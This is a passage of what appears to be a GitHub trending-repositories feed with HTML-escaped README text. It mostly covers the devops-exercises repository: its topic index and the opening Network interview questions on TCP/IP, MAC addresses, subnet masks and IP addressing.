&#xA; &lt;li&gt;Wiki文档（开放编辑）&lt;/li&gt; &#xA; &lt;li&gt;Bug修复&lt;/li&gt; &#xA; &lt;li&gt;新功能提交&lt;/li&gt; &#xA; &lt;li&gt;代码优化&lt;/li&gt; &#xA; &lt;li&gt;测试用例完善&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;问题反馈&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/hhyo/archery/issues&#34;&gt;Issues&lt;/a&gt;是本项目唯一的沟通渠道，如果在使用过程中遇到问题，请先查阅文档，如果仍无法解决，请查看相关日志，保存截图信息，给我们提交&lt;a href=&#34;https://github.com/hhyo/archery/issues&#34;&gt;Issue&lt;/a&gt;，请按照模板提供相关信息，否则会被直接关闭，感谢理解&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>bregman-arie/devops-exercises</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/bregman-arie/devops-exercises</id>
    <link href="https://github.com/bregman-arie/devops-exercises" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Linux, Jenkins, AWS, SRE, Prometheus, Docker, Python, Ansible, Git, Kubernetes, Terraform, OpenStack, SQL, NoSQL, Azure, GCP, DNS, Elastic, Network, Virtualization. DevOps Interview Questions&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/devops_exercises.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;span&gt;ℹ&lt;/span&gt; &amp;nbsp;This repo contains questions and exercises on various technical topics, sometimes related to DevOps and SRE&lt;/p&gt; &#xA;&lt;p&gt;&lt;span&gt;📊&lt;/span&gt; &amp;nbsp;There are currently &lt;strong&gt;2292&lt;/strong&gt; exercises and questions&lt;/p&gt; &#xA;&lt;p&gt;&lt;span&gt;📚&lt;/span&gt; &amp;nbsp;To learn more about DevOps and SRE, check the resources in &lt;a href=&#34;https://github.com/bregman-arie/devops-resources&#34;&gt;devops-resources&lt;/a&gt; repository&lt;/p&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; &amp;nbsp;You can use these for preparing for an interview but most of the questions and exercises don&#39;t represent an actual interview. Please read &lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/faq.md&#34;&gt;FAQ page&lt;/a&gt; for more details&lt;/p&gt; &#xA;&lt;p&gt;&lt;span&gt;👥&lt;/span&gt; &amp;nbsp;Join our &lt;a href=&#34;https://www.facebook.com/groups/538897960007080&#34;&gt;DevOps community&lt;/a&gt; where we have discussions and share resources on DevOps&lt;/p&gt; &#xA;&lt;p&gt;&lt;span&gt;📝&lt;/span&gt; &amp;nbsp;You can add more exercises by submitting pull requests :) Read about contribution guidelines &lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/CONTRIBUTING.md&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;!-- ALL-TOPICS-LIST:START --&gt; &#xA;&lt;!-- prettier-ignore-start --&gt; &#xA;&lt;!-- markdownlint-disable --&gt; &#xA;&lt;center&gt; &#xA; &lt;table&gt; &#xA;  &lt;tbody&gt;&#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/devops/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/devops.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;DevOps&#34;&gt;&lt;br&gt;&lt;b&gt;DevOps&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/cicd/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/cicd.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;cicd&#34;&gt;&lt;br&gt;&lt;b&gt;CI/CD&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/git/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/git.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Git&#34;&gt;&lt;br&gt;&lt;b&gt;Git&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/ansible/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/ansible.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;ansible&#34;&gt;&lt;br&gt;&lt;b&gt;Ansible&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#Network&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/network.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Network&#34;&gt;&lt;br&gt;&lt;b&gt;Network&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#linux&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/linux.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Linux&#34;&gt;&lt;br&gt;&lt;b&gt;Linux&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/software_development/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/programming.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;programming&#34;&gt;&lt;br&gt;&lt;b&gt;Software Development&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://github.com/bregman-arie/python-exercises&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/python.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Python&#34;&gt;&lt;br&gt;&lt;b&gt;Python&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#go&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/Go.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;go&#34;&gt;&lt;br&gt;&lt;b&gt;Go&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/shell/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/bash.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Bash&#34;&gt;&lt;br&gt;&lt;b&gt;Shell Scripting&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/kubernetes/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/kubernetes.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;kubernetes&#34;&gt;&lt;br&gt;&lt;b&gt;Kubernetes&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#prometheus&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/prometheus.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Prometheus&#34;&gt;&lt;br&gt;&lt;b&gt;Prometheus&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/cloud/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/cloud.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Cloud&#34;&gt;&lt;br&gt;&lt;b&gt;Cloud&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/aws/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/aws.png&#34; width=&#34;100px;&#34; height=&#34;75px;&#34; alt=&#34;aws&#34;&gt;&lt;br&gt;&lt;b&gt;AWS&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#azure&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/azure.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;azure&#34;&gt;&lt;br&gt;&lt;b&gt;Azure&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#gcp&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/googlecloud.png&#34; width=&#34;70px;&#34; height=&#34;70px;&#34; alt=&#34;Google Cloud Platform&#34;&gt;&lt;br&gt;&lt;b&gt;Google Cloud Platform&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#openstack&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/openstack.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;openstack&#34;&gt;&lt;br&gt;&lt;b&gt;OpenStack&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/security/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/security.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;security&#34;&gt;&lt;br&gt;&lt;b&gt;Security&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#operating-system&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/os.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Operating System&#34;&gt;&lt;br&gt;&lt;b&gt;Operating System&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#monitoring&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/monitoring.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Monitoring&#34;&gt;&lt;br&gt;&lt;b&gt;Monitoring&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#elastic&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/elastic.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Elastic&#34;&gt;&lt;br&gt;&lt;b&gt;Elastic&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#virtualization&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/virtualization.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Virtualization&#34;&gt;&lt;br&gt;&lt;b&gt;Virtualization&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/dns/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/dns.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;DNS&#34;&gt;&lt;br&gt;&lt;b&gt;DNS&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#Misc&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/general.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Misc&#34;&gt;&lt;br&gt;&lt;b&gt;Misc&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#testing&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/testing.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Testing&#34;&gt;&lt;br&gt;&lt;b&gt;Testing&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#databases&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/databases.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Databases&#34;&gt;&lt;br&gt;&lt;b&gt;Databases&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#regex&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/regex.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;RegEx&#34;&gt;&lt;br&gt;&lt;b&gt;Regex&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#system-design&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/design.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Design&#34;&gt;&lt;br&gt;&lt;b&gt;System Design&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#hardware&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/hardware.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Hardware&#34;&gt;&lt;br&gt;&lt;b&gt;Hardware&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#big-data&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/big-data.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Big Data&#34;&gt;&lt;br&gt;&lt;b&gt;Big Data&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#certificates&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/certificates.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Certificates&#34;&gt;&lt;br&gt;&lt;b&gt;Certificates&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/containers/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/containers.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Containers&#34;&gt;&lt;br&gt;&lt;b&gt;Containers&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#sql&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/sql.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;&lt;b&gt;SQL&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/openshift/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/openshift.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;OpenShift&#34;&gt;&lt;br&gt;&lt;b&gt;OpenShift&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#storage&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/storage.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Storage&#34;&gt;&lt;br&gt;&lt;b&gt;Storage&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/soft_skills/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/HR.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;HR&#34;&gt;&lt;br&gt;&lt;b&gt;Soft Skills&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/terraform/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/terraform.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Terraform&#34;&gt;&lt;br&gt;&lt;b&gt;Terraform&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#mongo&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/mongo.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Mongo&#34;&gt;&lt;br&gt;&lt;b&gt;Mongo&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#puppet&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/puppet.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;puppet&#34;&gt;&lt;br&gt;&lt;b&gt;Puppet&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#distributed&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/distributed.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;Distributed&#34;&gt;&lt;br&gt;&lt;b&gt;Distributed&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/#questions-you-ask&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/you.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;you&#34;&gt;&lt;br&gt;&lt;b&gt;Questions you can ask&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/perl/README.md&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/images/perl.png&#34; width=&#34;75px;&#34; height=&#34;75px;&#34; alt=&#34;perl&#34;&gt;&lt;br&gt;&lt;b&gt;Perl&lt;/b&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;  &lt;/tbody&gt;&#xA; &lt;/table&gt; &#xA;&lt;/center&gt; &#xA;&lt;!-- markdownlint-enable --&gt; &#xA;&lt;!-- prettier-ignore-end --&gt; &#xA;&lt;!-- ALL-TOPICS-LIST:END --&gt; &#xA;&lt;h2&gt;Network&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What do you need in order to communicate?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;A common language (for the two ends to understand)&lt;/li&gt; &lt;li&gt;A way to address who do you want to communicate with&lt;/li&gt; &lt;li&gt;A Connection (so the content of of the communication can reach the recipients) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is TCP/IP?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;A set of protocols that define how two or more devices can communicate with each other. To learn more about TCP/IP, read &lt;a href=&#34;http://www.penguintutor.com/linux/basic-network-reference&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is APIPA?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; APIPA is a set of it addresses that devices are allocated when the main DHCP server is not reachable &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What ip range does APIPA use?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; APIPA uses the ip range: 169.254.0.1 - 169.254.255.254. &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Ethernet?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Ethernet simply refers to the most common type of Local Area Network (LAN) used today. A LAN—in contrast to a WAN (Wide Area Network), which spans a larger geographical area—is a connected network of computers in a small area, like your office, college campus, or even home. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a MAC address? What is it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;A MAC address is a unique identification number or code used to identify individual devices on the network.&lt;/p&gt; &lt;p&gt;Packets that are sent on the ethernet are always coming from a MAC address and sent to a MAC address. If a network adapter is receiving a packet, it is comparing the packet’s destination MAC address to the adapter’s own MAC address.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;When is this MAC address used?: ff:ff:ff:ff:ff:ff&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;When a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF​), it is delivered to all stations on the local network. Ethernet broadcasts are used to resolve IP addresses to MAC addresses (by ARP) at the datalink layer . &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an IP address?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;An Internet Protocol address (IP address) is a numerical label assigned to each device connected to a computer network that uses the Internet Protocol for communication.An IP address serves two main functions: host or network interface identification and location addressing. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain subnet mask and given an example&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;A Subnet mask is a 32-bit number that masks an IP address, and divides the IP address into network address and host address. Subnet Mask is made by setting network bits to all &#34;1&#34;s and setting host bits to all &#34;0&#34;s. Within a given network, two host addresses are reserved for special purpose, and cannot be assigned to hosts. The &#34;0&#34; address is assigned a network address and &#34;255&#34; is assigned to a broadcast address, and they cannot be assigned to hosts.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;For Example&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;| Address Class | No of Network Bits | No of Host Bits | Subnet mask     | CIDR notation |&#xA;| ------------- | ------------------ | --------------- | --------------- | ------------- |&#xA;| A             | 8                  | 24              | 255.0.0.0       | /8            |&#xA;| A             | 9                  | 23              | 255.128.0.0     | /9            |&#xA;| A             | 12                 | 20              | 255.240.0.0     | /12           |&#xA;| A             | 14                 | 18              | 255.252.0.0     | /14           |&#xA;| B             | 16                 | 16              | 255.255.0.0     | /16           |&#xA;| B             | 17                 | 15              | 255.255.128.0   | /17           |&#xA;| B             | 20                 | 12              | 255.255.240.0   | /20           |&#xA;| B             | 22                 | 10              | 255.255.252.0   | /22           |&#xA;| C             | 24                 | 8               | 255.255.255.0   | /24           |&#xA;| C             | 25                 | 7               | 255.255.255.128 | /25           |&#xA;| C             | 28                 | 4               | 255.255.255.240 | /28           |&#xA;| C             | 30                 | 2               | 255.255.255.252 | /30           |&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a private IP address? In which scenarios/system designs, one should use it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; Private IP addresses are assigned to the hosts in the same network to communicate among one another. As the name &#34;private&#34; suggests, the devices having the priate IP addresses assigned can&#39;t be reached by the devices from any external network. For example, if I am living in a hostel and I want my hostelmates to join the game server I have hosted, I will ask them to join via my server&#39;s private IP address, since the network is local to the hostel. &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a public IP address? In which scenarios/system designs, one should use it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; A public IP address is the public facing IP address. In the event that you was hosting a game server that you want your friends to join, you will give your friends your public IP address to allow their computers to identify and locate your network and server in order for the connection to take place. One time that you would not need to use a public facing IP address is in the event that you was playing with friends who was connected to the same network as you, in that case, you would use a private ip address. In order for someone to be able to connect to your server that is located internally, you will have to setup a port forward to tell your router to allow traffic from the public domain into your network and vice versa. &lt;/b&gt;&#xA;&lt;/details&gt; 